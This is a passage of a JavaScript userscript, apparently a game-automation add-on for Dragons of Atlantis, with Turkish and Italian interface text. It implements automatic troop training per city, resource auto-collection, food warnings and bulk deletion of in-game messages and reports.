  outpost2Troops : ['Porter', 'Conscript', 'Spy', 'Halberdsman', 'Minotaur', 'Longbowman', 'SwiftStrikeDragon', 'BattleDragon', 'ArmoredTransport', 'Giant', 'FireMirror', 'StoneTroop'],
  outpost3Troops : ['Porter', 'Conscript', 'Spy', 'Halberdsman', 'Minotaur', 'Longbowman', 'SwiftStrikeDragon', 'BattleDragon', 'ArmoredTransport', 'Giant', 'FireMirror', 'FireTroop'],
  
  init : function (div){
    var t = Tabs.Train;
    t.cont = div;
    

	for (var c=0; c<Seed.s.cities.length; c++)
		if (!Data.options.autoTrain.city[c])
			Data.options.autoTrain.city[c] = {};


    for (var c=0; c<Seed.s.cities.length; c++) {
        if (!Data.options.autoTrain.city[c].troopType) {
            Data.options.autoTrain.city[c].troopType = [];
            for (tt=0; tt<t.capitalTroops.length; tt++)
                Data.options.autoTrain.city[c].troopType[tt] = {};
        }
    }
    
    // Create status ticker
    var m = '<DIV class=pbTitle>'+translate('OTO EGITIM')+'</div>\
      <DIV class=pbStatBox><CENTER><INPUT id=pbtrnOnOff type=submit\></center>\
      <DIV id=pbtrnTrnStat></div> <BR> <DIV id=pbtrnFeedback style="font-weight:bold; border: 1px solid #AA00FF; height:17px"></div>  </div>\
      <DIV id=pbtrnConfig class=pbInput>';
	  
	// Create troop table for each city
	var el = [];
    for (var c=0; c<Seed.s.cities.length; c++){
        switch (c) {
            case 1:
                troopTypes = t.outpost1Troops;
                break;
            case 2:
                troopTypes = t.outpost2Troops;
                break;
			case 3:
                troopTypes = t.outpost3Troops;
                break;
            default:
                troopTypes = t.capitalTroops;
        }
        var city = Seed.s.cities[c];
        m += '<DIV class=pbSubtitle><TABLE class=pbTab><TR><TD>'+translate('City')+' #'+ (c+1) +'</td><TD width=80% align=center>'+ translate( city.name ) +'</td><TD align=right>'+ city.x +','+ city.y +'</td></tr></table></div><TABLE class=pbTab><TR valign=top><TD width=150><TABLE class=pbTab>';
		for (tt=0; tt<troopTypes.length; tt++){
			// Use less room in the table layout
			if (tt%3 == 0) m += '<TR>';
			m += '<TD class=pbTabLeft>'+ Names.troops.byName[troopTypes[tt]][2] +':</td>';
			var num = Data.options.autoTrain.city[c].troopType[tt];
			if (!num || isNaN(num))
				num = 0;
			m += '<TD><INPUT type=text id=pbtrnTrp_'+ c +'_'+ tt +' maxlength=6 size=2 value="'+ num +'"\></td>';
			if (tt>0 && (tt+1)%3 == 0) m += '</tr>';
			el.push('pbtrnTrp_'+ c +'_'+ tt);
		}
		m += ((tt+1)%3 == 0) ? '</tr></table></td></tr></table>' : '</table></td></tr></table>';
    }    
    m += '</div>';
    div.innerHTML = m;

	// Add event listeners for troop quantities 
    for (var i=0; i<el.length; i++)
      document.getElementById(el[i]).addEventListener('change', troopsChanged, false);
	  
    t.setEnable (Data.options.autoTrain.enabled);
	
	// Add event listener for auto on/off button
    document.getElementById('pbtrnOnOff').addEventListener ('click', function (){
      t.setEnable (!Data.options.autoTrain.enabled);
    }, false);
	
	// Update troops on change
    function troopsChanged (e){
		var args = e.target.id.split('_');
		var x = parseIntZero(e.target.value);
		if (isNaN(x) || x<0 || x>100000){
			e.target.style.backgroundColor = 'red';
            dispError ('Il numero delle truppe non e\' corretto.'); // TODO: Translate
		} else {
			e.target.value = x;
			Data.options.autoTrain.city[args[1]].troopType[args[2]] = x;
			e.target.style.backgroundColor = '';
		}
    }

	// Display error message
    function dispError (msg){
		var dial = new ModalDialog (t.cont, 300, 150, '', true);
		dial.getContentDiv().innerHTML = msg;
    }
	
  },
  
  hide : function (){
    var t = Tabs.Train;
    clearTimeout (t.statTimer);
  },
  show : function (){
    var t = Tabs.Train;
    t.statTick();
  },
  
   setEnable : function (onOff){
    var t = Tabs.Train;
    var but = document.getElementById('pbtrnOnOff');
    clearTimeout (t.trainTimer);
    Data.options.autoTrain.enabled = onOff;
    if (onOff){
      but.value = ''+translate('Oto Egitim')+' Acik';
      but.className = 'butAttackOn';
      t.trainTick(0);
    } else {
      but.value = ''+translate('Oto Egitim')+' Kapali';
      but.className = 'butAttackOff';
    }
  },
  
  statTick : function (){
    var t = Tabs.Train;
    var m = '<TABLE class=pbTabPad>';
    clearTimeout (t.statTimer);
    for (var c=0; c<Seed.s.cities.length; c++){
        var last = serverTime();
        var trains = [];
	    	var city = Seed.s.cities[c];
        for (var j=0; j<Seed.s.cities[c].jobs.length; j++){
        if (city.jobs[j].queue=='units' && city.jobs[j].unit_type)
            trains.push (city.jobs[j]);
        }
		if (trains.length != 0) {
            for (var j=0; j<trains.length; j++){
                var left='', tot='';
                if (j==0)
	            left = ''+ translate(city.name)+'</td>        <TD>'+ translate( 'Egitiliyor' ) +'';
                else if (j==trains.length-1)
                    tot = '  <B>('+ timestrShort(trains[j].run_at-serverTime()) +')</b>';
		 	m += '<TR><TD>'+ left +'</td><TD>'+trains[j].quantity +' '+ translate( trains[j].unit_type )+' </td><TD> '
			+ timestr(trains[j].run_at-last, true)+ tot + '</td></tr>';
            last = trains[j].run_at;
			}   
		}
		else{
			m += '<TR><TD>'+ translate(city.name) +'</td><TD><SPAN class=boldRed>'+translate( 'No' )+'</span></td></tr>';
		}
	}
    document.getElementById('pbtrnTrnStat').innerHTML = m +'</table>';
    t.statTimer = setTimeout (t.statTick, 1000);
  },
  
  dispFeedback : function (msg){
    document.getElementById('pbtrnFeedback').innerHTML = new Date().toTimeString().substring (0,8) +' '+  msg;
  },

  errorCount : 0,
  reChecked : false,
  trainTick : function (ic){
    var t = Tabs.Train;
    clearTimeout (t.trainTimer);
    if (!Data.options.autoTrain.enabled)
      return;    
    Seed.notifyOnUpdate(function(){ 
        if (ic == Seed.s.cities.length) {
            t.trainTick(0);
            return;
        }
        switch (ic) {
            case 1:
                troopsLength = t.outpost1Troops.length;
                break;
            case 2:
                troopsLength = t.outpost2Troops.length;
                break;
			      case 3:
			         	troopsLength = t.outpost3Troops.length;
			         	break;
            default:
                troopsLength = t.capitalTroops.length;
        }
        if (getTrainJob (ic) == null) {
                var count = 0;
                t.attemptTrain(ic, count, troopsLength);
                return;
        } else {
            ic = ic + 1;
            t.trainTimer = setTimeout (function() {t.trainTick(ic) }, 3000);
            return;
        }
    }); 
  },
  
    attemptTrain : function (ic, count, troopsLength){
        var t = Tabs.Train;
        clearTimeout (t.trainTimer);
        if (count == troopsLength) {
            t.trainTick(ic+1);
            return;
        }
        switch (ic) {
            case 1:
                var troopType = t.outpost1Troops[count];
                var troopQty = Data.options.autoTrain.city[ic].troopType[count];
                break;
            case 2:
                var troopType = t.outpost2Troops[count];
                var troopQty = Data.options.autoTrain.city[ic].troopType[count];
                break;
            case 3:
                var troopType = t.outpost3Troops[count];
                var troopQty = Data.options.autoTrain.city[ic].troopType[count];
                break;
            default:
                var troopType = t.capitalTroops[count];
                var troopQty = Data.options.autoTrain.city[ic].troopType[count];
        }
        if (troopQty > 0) {
            t.doTrain(troopType, troopQty, ic, count, troopsLength);
            return;
        } else {
            count = count + 1;
            t.attemptTrain(ic, count, troopsLength);
            return;        
        }        
    },
  
    doTrain : function (troopType, troopQty, ic, count, troopsLength){
        var t = Tabs.Train;
        var city = Seed.s.cities[ic];
        var msg = translate('Training')+ ' ' +troopQty + ' ' +translate( troopType ) +' '+ 'in' + ' ' + translate( city.name );
        t.dispFeedback (msg);
        Ajax.troopTraining (troopType, troopQty, city.id, function (rslt){
            Seed.fetchCity (city.id, 1000);
            t.statTick();
            if (rslt.ok){
                t.errorCount = 0;
                actionLog (msg);
                count = count + 1;
                t.trainTimer = setTimeout (function(){ t.attemptTrain(ic, count, troopsLength) }, 3000);
                return;
            } else {
                Seed.fetchSeed();
                actionLog ('ERRORE ADDESTR.: '+ rslt.errmsg); // TODO: Translate
                if (++t.errorCount > 3){
                    t.dispFeedback ( translate('Troppi errori, verra\' disabilitato l\'Auto-Addestramento') ); // TODO: Translate
                    t.setEnable (false);
                    return;
                }
                t.dispFeedback ('ERRORE ADDESTR.: '+ rslt.errmsg); // TODO: Translate
                t.trainTimer = setTimeout (t.trainTick, 20000);
                return;
            }
        });
    },
}

function getTrainJob (cityIdx){
    var cid = Seed.s.cities[cityIdx].id;
    var jobs = Seed.jobs[cid];
    for (var p in jobs){
        if (jobs[p].queue == 'units')
            return jobs[p];
    }
    return null;
}




// RICARICA INTELIGENTE

var myServerId = null;
function getServerId() {
  if (myServerId == null){
    var m=/^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);
    if (m)
      myServerId = m[1];
    else
      myServerId = '??';
  }
  return myServerId;
}

function reloadTools (){
  var serverId = getServerId();
  if(serverId == '??') window.location.reload(true);
  var jumpTo = 'http://apps.facebook.com/dragonsofatlantis/realm/'+serverId;
  var t = '<FORM target="_top" action="'+ jumpTo +'" method=post><INPUT id=xxpbButReload type=submit value=RELOAD><INPUT type=hidden name=s value="'+ serverId +'"</form>';
  var e = document.createElement ('div');
  e.innerHTML = t;
  document.body.appendChild (e);
  setTimeout (function (){document.getElementById('xxpbButReload').click();}, 0);
}
  


/*********************************** Options Tab ***********************************/

Tabs.Options = {
  tabOrder : OPTIONS_TAB_ORDER,
  tabLabel : gOpts,
  cont : null,
  readMsgsTimer : null,
  readPagesTimer : null,
  pagesMessages : 0,
  pageReading : 0,
  fixAvailable : {},
  readList : [],
  idsToDelete : [],
  year : [],
  month : [],
  day : [],
  msDate : [],
  cat: '',

  init : function (div){
    var t = Tabs.Options;
    var dataOggi = new Date();
    t.year[0] = 2010;
    t.month[0] = 10;
    t.day[0] = 1;
    t.year[1] = dataOggi.getFullYear();
    t.month[1] = dataOggi.getMonth()+1;
    t.day[1] = dataOggi.getDate();
    t.msDate[0] = 0;
    t.msDate[1] = 0;
    t.cont = div;
    try {      
      var m = '<DIV class=pbTitle style="margin-bottom:10px">'+translate( 'ProEkip Tools Ayarlar' )+'</div><TABLE class=pbTab>\
        <TR valign=top><TD colspan=3><B>'+translate( 'Yapilandirma' )+':</b></td></tr>\
        <TR valign=top><TD colspan=3><INPUT id=ptAllowWinMove type=checkbox '+(Data.options.ptWinDrag?' CHECKED':'')+' /> '+translate( 'Ekranin Mouseyle Kaydirilmasina Izin Ver' )+'</td></tr>\
        <TR valign=top><TD colspan=3><BR><B>'+translate( 'Features' )+':</b></td></tr>\
        <TR><TD><INPUT id=pboptACol type=checkbox'+(Data.options.autoCollect.enabled?' CHECKED':'')+' /> '+translate( 'Hammaddeleri Otomatik Topla Her')+'</td><TD><INPUT id=pboptAColTime size=1 maxlength=2 type=text value="'+ Data.options.autoCollect.delay +'" /></td><TD>\
        <SELECT id=pboptAColUnit size=1>\
          <OPTION value=1 '+(Data.options.autoCollect.unit == 1 ? 'selected' : '')+'>'+translate( 'Saniye' )+'</option>\
          <OPTION value=60 '+(Data.options.autoCollect.unit == 60 ? 'selected' : '')+'>'+translate( 'Dakika' )+'</option>\
          <OPTION value=3600 '+(Data.options.autoCollect.unit == 3600 ? 'selected' : '')+'>'+translate( 'Saat' )+'</option>\
          <OPTION value=86400 '+(Data.options.autoCollect.unit == 86400 ? 'selected' : '')+'>'+translate( 'Gun' )+'</option>\
        </select></td></tr>';
      m += '<TR valign=top><TD colspan=3><BR><B>'+translate( 'Warnings' )+':</b></td></tr>\
        <TR><TD><INPUT id=pboptWngFood type=checkbox'+(Data.options.warningFood.enabled?' CHECKED':'')+' /> '+translate( 'Yemek Bu KDar Yetmicek Olursa Alarm Ver:' )+'</td><TD><INPUT id=pboptWngFoodTime size=1 maxlength=2 type=text value="'+ Data.options.warningFood.delay +'" /></td><TD>\
        <SELECT id=pboptWngFoodUnit size=1>\
          <OPTION value=3600 '+(Data.options.warningFood.unit == 3600 ? 'selected' : '')+'>'+translate( 'Saat' )+'</option>\
          <OPTION value=86400 '+(Data.options.warningFood.unit == 86400 ? 'selected' : '')+'>'+translate( 'Gun' )+'</option>\
        </select></td></tr>\
        <TR><TD colspan=3><INPUT id=pboptSndFood type=checkbox'+(Data.options.warningFood.sound?' CHECKED':'')+' /> '+translate( 'Az Yemek Sesli Alarmini Aktive Et' )+'</td>';
      m += '</table>';
      m += '<TABLE class=pbTab><TR valign=top><TD colspan=2><BR><B>'+translate( 'Mesaj Silme' )+':</b></td></tr>';
      m += '<TR><TD>'+translate( 'Delete messages of these type' )+':</td><TD>';
      m += '<SELECT id=pboptMsgToDelete size=1>\
          <OPTION value=0 '+(Data.options.checkForDel.type==MESSAGES_ALL ? 'selected' : '')+'>'+translate( 'Hepsi' )+'</option>\
          <OPTION value=1 '+(Data.options.checkForDel.type==MESSAGES_ONLY ? 'selected' : '')+'>'+translate( 'Mesajlar' )+'</option>\
          <OPTION value=2 '+(Data.options.checkForDel.type==REPORTS_ONLY ? 'selected' : '')+'>'+translate( 'Raporlar' )+'</option>\
        </select></td></tr>';
      m += '<TR valign=top><TD colspan=2><I>'+translate( 'Messages' )+':</i></td></tr>';
      m += '<TR><TD><INPUT id=pbchkMsgGame type=checkbox'+(Data.options.checkForDel.msgGame?' CHECKED':'')+' /> '+translate ( 'Oyun Mesajlari' )+'</td>';
      m += '<TD><INPUT id=pbchkMsgPlayer type=checkbox'+(Data.options.checkForDel.msgPlayer?' CHECKED':'')+' /> '+translate ( 'Oyuncu Mesajlari' )+'</td></tr>';
      m += '<TR><TD><INPUT id=pbchkMsgSentinel type=checkbox'+(Data.options.checkForDel.msgSentinel?' CHECKED':'')+' /> '+translate ( 'Gozcu Alarmlari' )+'</td>';
      m += '<TD><INPUT id=pbchkMsgAlliance type=checkbox'+(Data.options.checkForDel.msgAlliance?' CHECKED':'')+' /> '+translate ( 'Ittifak Mesajlari' )+'</td></tr>';
      m += '<TR valign=top><TD colspan=2><I>'+translate( 'Reports' )+':</i></td></tr>';
      m += '<TR><TD><INPUT id=pbchkRptAnthropus type=checkbox'+(Data.options.checkForDel.rptAnthropus?' CHECKED':'')+' /> '+translate ( 'Kamp/Bozkir Raporlari' )+'</td>';
      m += '<TD><INPUT id=pbchkRptTransport type=checkbox'+(Data.options.checkForDel.rptTransport?' CHECKED':'')+' /> '+translate ( 'Nakliye Raporlari' )+'</td></tr>';
      m += '<TR><TD><INPUT id=pbchkRptSpy type=checkbox'+(Data.options.checkForDel.rptSpy?' CHECKED':'')+' /> '+translate ( 'Casus Raporlari' )+'</td>';
      m += '<TD><INPUT id=pbchkRptBattle type=checkbox'+(Data.options.checkForDel.rptBattle?' CHECKED':'')+' /> '+translate ( 'Savas Raporlari' )+'</td></tr>';
      m += '<TR><TD colspan=2><INPUT id=pbchkRptReinforcement type=checkbox'+(Data.options.checkForDel.rptReinforcement?' CHECKED':'')+' /> '+translate ( 'Tahkim Raporlari' )+'</td></tr>';
      m += '<TR valign=top><TD colspan=2><I>'+translate( 'Exclusions' )+':</i></td></tr>';
      m += '<TR><TD colspan=2><INPUT id=pbchkRptExcludeMe type=checkbox'+(Data.options.checkForDel.rptExcludeMe?' CHECKED':'')+' /> '+translate ( 'Diger Oyunculardan Bana Gelen Savas Raporlarini Gosterme' )+'</td></tr>';
      m += '<TR valign=top><TD><I>'+translate( 'Date Range' )+':</i></td><TD><INPUT id=pbchkDateAll type=checkbox'+(Data.options.checkForDel.dateAll?' CHECKED':'')+' /> '+translate ( 'Hepsi' )+'</td></tr>';
      m += '<TR>';
      var txt;
      for (var type=0;type<2;type++)
      {
        txt = (type==0?'From':'To');
        m += '<TD>'+translate( txt )+': ';
        m += '<SELECT id=pboptDay'+type+' size=1>';
        for (var i=1;i<32;i++)
          m += '<OPTION value='+i+(i==t.day[type]?' selected':'')+'>'+(i<10?'0':'')+i+'</option>';
        m += '</select>';
        m += '<SELECT id=pboptMonth'+type+' size=1>';
        for (var i=1;i<13;i++)
          m += '<OPTION value='+i+(i==t.month[type]?' selected':'')+'>'+(i<10?'0':'')+i+'</option>';
        m += '</select>';
        m += '<SELECT id=pboptYear'+type+' size=1>';
        for (var i=2010;i<t.year[1]+1;i++)
          m += '<OPTION value='+i+(i==t.year[type]?' selected':'')+'>'+i+'</option>';
        m += '</select></td>';
      }
      m += '</tr>';
      m += '<TR><TD colspan=2><INPUT id=pbbtnDelete type=submit value=" '+translate( 'Delete Now!' )+' " /></td></tr>';
      m += '</table><DIV id=pbForDelete></div><HR>';
      t.cont.innerHTML = m;
      document.getElementById('ptAllowWinMove').addEventListener ('change', enableChecked, false);
      document.getElementById('pboptACol').addEventListener ('change', enableChecked, false);
      document.getElementById('pboptWngFood').addEventListener ('change', enableChecked, false);
      document.getElementById('pboptSndFood').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkMsgGame').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkMsgPlayer').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkMsgSentinel').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkMsgAlliance').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkRptAnthropus').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkRptTransport').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkRptSpy').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkRptBattle').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkRptReinforcement').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkRptExcludeMe').addEventListener ('change', enableChecked, false);
      document.getElementById('pbchkDateAll').addEventListener ('change', enableChecked, false);
      document.getElementById('pbbtnDelete').addEventListener ('click', t.beforeDeleteReport, false);
      document.getElementById('pboptAColTime').addEventListener ('change', ctlChanged, false);
      document.getElementById('pboptAColUnit').addEventListener ('change', ctlChanged, false);
      document.getElementById('pboptWngFoodTime').addEventListener ('change', ctlChanged, false);
      document.getElementById('pboptWngFoodUnit').addEventListener ('change', ctlChanged, false);
      document.getElementById('pboptMsgToDelete').addEventListener ('change', ctlChanged, false);
      for (var type=0;type<2;type++)
      {
        document.getElementById('pboptDay'+type).addEventListener ('change', ctlChanged, false);
        document.getElementById('pboptMonth'+type).addEventListener ('change', ctlChanged, false);
        document.getElementById('pboptYear'+type).addEventListener ('change', ctlChanged, false);
        disableCheckMsgsRpts(false);
        disableDates();
      }
    } catch (e) {
      t.cont.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';  
    }

    function enableChecked (e){
      var args = e.target.id.split('_');
      if (e.target.id=='ptAllowWinMove')
        mainPop.setEnableDrag(e.target.checked);
      else if (e.target.id=='pboptACol')
        AutoCollect.setEnable(e.target.checked);
      else if (e.target.id=='pboptWngFood')
        Data.options.warningFood.enabled = e.target.checked;
      else if (e.target.id=='pboptSndFood')
        Data.options.warningFood.sound = e.target.checked;
      else if (e.target.id=='pbchkMsgGame')
        Data.options.checkForDel.msgGame = e.target.checked;
      else if (e.target.id=='pbchkMsgPlayer')
        Data.options.checkForDel.msgPlayer = e.target.checked;
      else if (e.target.id=='pbchkMsgSentinel')
        Data.options.checkForDel.msgSentinel = e.target.checked;
      else if (e.target.id=='pbchkMsgAlliance')
        Data.options.checkForDel.msgAlliance = e.target.checked;
      else if (e.target.id=='pbchkRptAnthropus')
        Data.options.checkForDel.rptAnthropus = e.target.checked;
      else if (e.target.id=='pbchkRptTransport')
        Data.options.checkForDel.rptTransport = e.target.checked;
      else if (e.target.id=='pbchkRptSpy')
        Data.options.checkForDel.rptSpy = e.target.checked;
      else if (e.target.id=='pbchkRptBattle')
        Data.options.checkForDel.rptBattle = e.target.checked;
      else if (e.target.id=='pbchkRptReinforcement')
        Data.options.checkForDel.rptReinforcement = e.target.checked;
      else if (e.target.id=='pbchkRptExcludeMe')
        Data.options.checkForDel.rptExcludeMe = e.target.checked;
      else if (e.target.id=='pbchkDateAll')
      {
        Data.options.checkForDel.dateAll = e.target.checked;
        disableDates();
      }
    }

    function disableCheckMsgsRpts(byCtl)
    {
      disableCheckMessages(false);
      disableCheckReports(false);
      setCheckMessages((Data.options.checkForDel.type!=REPORTS_ONLY), byCtl);
      setCheckReports((Data.options.checkForDel.type!=MESSAGES_ONLY), byCtl);
      if (Data.options.checkForDel.type!=MESSAGES_ALL)
      {
        disableCheckMessages((Data.options.checkForDel.type==REPORTS_ONLY));
        disableCheckReports((Data.options.checkForDel.type==MESSAGES_ONLY));
      }
    }
    
    function disableDates()
    {
      for (var type=0;type<2;type++)
      {
        document.getElementById('pboptDay'+type).disabled = Data.options.checkForDel.dateAll;
        document.getElementById('pboptMonth'+type).disabled = Data.options.checkForDel.dateAll;
        document.getElementById('pboptYear'+type).disabled = Data.options.checkForDel.dateAll;
      }
    }
    
    function ctlChanged (e){
      var t = Tabs.Options;
      var elem = document.getElementById(e.target.id);
      var value = parseIntZero (elem.value);
      elem.value = value;
      if (e.target.id=='pboptAColTime')
        Data.options.autoCollect.delay = value;
      else if (e.target.id=='pboptAColTime')
        Data.options.warningFood.delay = value;
      else if (e.target.id=='pboptAColUnit')
        Data.options.autoCollect.unit = value;
      else if (e.target.id=='pboptWngFoodUnit')
        Data.options.warningFood.unit = value;
      else if (e.target.id=='pboptMsgToDelete')
      {
        Data.options.checkForDel.type = value;
        disableCheckMsgsRpts(true);
      }
      else
      {
        for (var type=0;type<2;type++)
        {
          if (e.target.id=='pboptDay'+type)
            t.day[type] = value;
          else if (e.target.id=='pboptMonth'+type)
            t.month[type] = value;
          else if (e.target.id=='pboptYear'+type)
            t.year[type] = value;
        }
      }
    }
    
    function disableCheckMessages (OnOff)
    {
      document.getElementById('pbchkMsgGame').disabled = OnOff;
      document.getElementById('pbchkMsgPlayer').disabled = OnOff;
      document.getElementById('pbchkMsgSentinel').disabled = OnOff;
      document.getElementById('pbchkMsgAlliance').disabled = OnOff;
    }
    
    function setCheckMessages (OnOff, byCtl)
    {
      document.getElementById('pbchkMsgGame').checked = OnOff;
      document.getElementById('pbchkMsgPlayer').checked = OnOff;
      document.getElementById('pbchkMsgSentinel').checked = OnOff;
      document.getElementById('pbchkMsgAlliance').checked = OnOff;
      if (byCtl)
      {
        Data.options.checkForDel.msgGame = OnOff;
        Data.options.checkForDel.msgPlayer = OnOff;
        Data.options.checkForDel.msgSentinel = OnOff;
        Data.options.checkForDel.msgAlliance = OnOff;
      }
    }
    
    function disableCheckReports (OnOff)
    {
      document.getElementById('pbchkRptAnthropus').disabled = OnOff;
      document.getElementById('pbchkRptTransport').disabled = OnOff;
      document.getElementById('pbchkRptSpy').disabled = OnOff;
      document.getElementById('pbchkRptBattle').disabled = OnOff;
      document.getElementById('pbchkRptReinforcement').disabled = OnOff;
      document.getElementById('pbchkRptExcludeMe').disabled = OnOff;
    }
    
    function setCheckReports (OnOff, byCtl)
    {
      document.getElementById('pbchkRptAnthropus').checked = OnOff;
      document.getElementById('pbchkRptTransport').checked = OnOff;
      document.getElementById('pbchkRptSpy').checked = OnOff;
      document.getElementById('pbchkRptBattle').checked = OnOff;
      document.getElementById('pbchkRptReinforcement').checked = OnOff;
      document.getElementById('pbchkRptExcludeMe').checked = OnOff;
      if (byCtl)
      {
        Data.options.checkForDel.rptAnthropus = OnOff;
        Data.options.checkForDel.rptTransport = OnOff;
        Data.options.checkForDel.rptSpy = OnOff;
        Data.options.checkForDel.rptBattle = OnOff;
        Data.options.checkForDel.rptReinforcement = OnOff;
        Data.options.checkForDel.rptExcludeMe = OnOff;
      }
    }
  },

  beforeDeleteReport : function ()
  {
    var t = Tabs.Options;
    var leastOneCheck=false;

    if (Data.options.checkForDel.type!=REPORTS_ONLY)
    {
      if (Data.options.checkForDel.msgGame || Data.options.checkForDel.msgPlayer || Data.options.checkForDel.msgSentinel || Data.options.checkForDel.msgAlliance)
        leastOneCheck = true;
    }    
    if (!leastOneCheck && Data.options.checkForDel.type!=MESSAGES_ONLY)
    {
      if (Data.options.checkForDel.rptAnthropus || Data.options.checkForDel.rptTransport || Data.options.checkForDel.rptSpy || Data.options.checkForDel.rptBattle || Data.options.checkForDel.rptReinforcement)
        leastOneCheck = true;
    }
    if (!leastOneCheck)
    {
      var dial = new ModalDialog (t.cont, 300, 150, '', true);
      dial.getContentDiv().innerHTML = '<B>'+translate( 'Select at least one type of message or report' )+'!</b>';
      return;
    }
    if (!Data.options.checkForDel.dateAll)
    {
      var txt;
      for (type=0;type<2;type++)
      {
        txt = (type==0?'From':'To');
        if (!isValidDate(t.day[type],t.month[type],t.year[type]))
        {
          var dial = new ModalDialog (t.cont, 300, 150, '', true);
          dial.getContentDiv().innerHTML = '<B>'+translate( 'Invalid Date '+txt )+'!</b>';
          return;
        }
        t.msDate[type] = Date.parse(new Date(Date.UTC(t.year[type], t.month[type]-1, t.day[type], 0, 0, 0)))/1000;
      }
      if (t.msDate[1]<t.msDate[0])
      {
        var dial = new ModalDialog (t.cont, 300, 150, '', true);
        dial.getContentDiv().innerHTML = '<B>'+translate( 'Invalid Range Date' )+'!</b>';
        return;
      }
      t.msDate[1] += 86400;
    }

    t.cat = 'all';
    if (Data.options.checkForDel.type==MESSAGES_ONLY)
      t.cat = 'messages';
    else if (Data.options.checkForDel.type==REPORTS_ONLY)
      t.cat = 'reports';
    var totMessages = 0;
    t.pagesMessages = 0;
    Ajax.messageList (t.cat, -1, function (rslt){
      if (rslt==null)
        return;
      var t = Tabs.Options;
      totMessages = parseIntNan(rslt);
      if (totMessages==0)
        return;
      else
      {
        t.pagesMessages = parseInt(totMessages/12);
        if (totMessages%12!=0)
          t.pagesMessages++;
        t.readList = [];
        t.pageReading = t.pagesMessages;
        clearTimeout (t.readPagesTimer);
        t.readPagesTimer = setTimeout (t.readPages, 2000);
      }
    });
    
    function isValidDate(day, month, year)
    {
      var result=false;
      var daysMonth;
      if ((month<8 && month%2==1) || (month>7 && month%2==0))
        daysMonth=31;
      else if (month!=2)
        daysMonth=30;
      else if (isLeapYear(year))
        daysMonth=29;
      else
        daysMonth=28;
      if (day>0 && day<daysMonth && month>0 && month<13)
        result=true;
      return result;
    }
    
    function isLeapYear(year)
    {
      var result=false;
      if (year%4==0)
      {
        result=true;
        if (year%100==0 && year%400!=0)
          result=false;
      }
      return result;
    }
  },
  
  readPages : function ()
  {
    var t = Tabs.Options;
    document.getElementById('pbForDelete').innerHTML = '<CENTER>' + 'Sto leggendo la pagina ' + (t.pagesMessages+1-t.pageReading) + ' di ' + t.pagesMessages +'</center>'; //TODO Translate
    clearTimeout (t.readPagesTimer);
    Ajax.messageList (t.cat, t.pageReading, function (rslt){
      if (rslt==null)
        return;
      var typeMsg;
//logit ('messageList:\n' + inspect (rslt, 7, 1));        
      for (var i=rslt.length-1; i>=0; i--)
      {
        var msgToDelete=true;
        if (rslt[i].report_type=="BattleReport")
        {
          typeMsg = MSG_BATTLE_REPORT;
          msgToDelete = (Data.options.checkForDel.rptBattle || Data.options.checkForDel.rptAnthropus);
        }
        else if (rslt[i].report_type=="TransportMarchReport")
        {
          typeMsg = TRANSPORT_MARCH_REPORT;
          msgToDelete = Data.options.checkForDel.rptTransport;
        }
        else if (rslt[i].report_type=="SpyReport")
        {
          typeMsg = SPY_REPORT;
          msgToDelete = Data.options.checkForDel.rptSpy;
        }
        else if (rslt[i].report_type=="SentinelWarning")
        {
          typeMsg = SENTINEL_WARNING;
          msgToDelete = Data.options.checkForDel.msgSentinel;
        }
        else if (rslt[i].report_type=="ReinforcementsReport")
        {
          typeMsg = REINFORCEMENTS_REPORT;
          msgToDelete = Data.options.checkForDel.rptReinforcement;
        }
        else if (rslt[i].report_type=="SystemMessage")
        {
          typeMsg = SYSTEM_MESSAGE;
          msgToDelete = Data.options.checkForDel.msgGame;
        }
        else if (rslt[i].report_type=="PlayerMessage")
        {
          typeMsg = PLAYER_MESSAGE;
          msgToDelete = Data.options.checkForDel.msgPlayer;
        }
        else if (rslt[i].report_type=="AllianceMessage")
        {
          typeMsg = ALLIANCE_MESSAGE;
          msgToDelete = Data.options.checkForDel.msgAlliance;
        }
        else
          msgToDelete = false;
        if (msgToDelete && !Data.options.checkForDel.dateAll)
        {
          if (rslt[i].created_at<t.msDate[0]||rslt[i].created_at>t.msDate[1])
            msgToDelete = false;
        }
        var index = rslt[i].id*1000+t.pageReading*10+typeMsg;
        if (msgToDelete && t.readList.indexOf(index) < 0)
          t.readList.push (index);
      }
      if (t.pageReading>1)
      {
        t.pageReading--;
        t.readPagesTimer = setTimeout (t.readPages, 2000);
      }
      else if (t.readList.length != 0)
      {
        t.idsToDelete = [];
        clearTimeout (t.readMsgsTimer);
        t.readMsgsTimer = setTimeout (t.readMsgs, 2000);
      }
      else
        document.getElementById('pbForDelete').innerHTML = '';
    });
  },
  
  readMsgs : function ()
  {
    var t = Tabs.Options;
    var index = t.readList[0];
    document.getElementById('pbForDelete').innerHTML = '<CENTER>' + 'Silindi' + '</center>'; //TODO Translate
    if (!index){
      if (t.idsToDelete.length>0)
      {
        Ajax.messageDelete (t.idsToDelete);
        var dial = new ModalDialog (t.cont, 300, 150, '', true);
        dial.getContentDiv().innerHTML = '<B>'+'İptal'+'!</b>'; //TODO Translate
        t.idsToDelete = [];
        document.getElementById('pbForDelete').innerHTML = '';
      }
      logit ('t.readList BAD MESSAGE ID:\n'+ inspect (t.readList, 8, 1));
      return;
    }
    id = parseInt(index/1000);
    var typeMsg = index%10;    
    clearTimeout (t.readMsgsTimer);
    Ajax.messageDetail (id, function (rslt){
      var msgToDelete=true;
      if (typeMsg==MSG_BATTLE_REPORT)
      {
        if (Data.options.checkForDel.rptBattle)
        {
          msgToDelete=rslt.report.sanctuary;
          if (msgToDelete && Data.options.checkForDel.rptExcludeMe && rpt.report.attacker.name == Seed.s.name)
            msgToDelete=false;
        }
        else if (Data.options.checkForDel.rptAnthropus)
          msgToDelete=!rslt.report.sanctuary;
      }
      if (msgToDelete)
      {
        if (t.idsToDelete.length>11)
        {
          Ajax.messageDelete (t.idsToDelete);
          t.idsToDelete = [];
        }
        t.idsToDelete.push (id);
      }
      t.readList.shift();
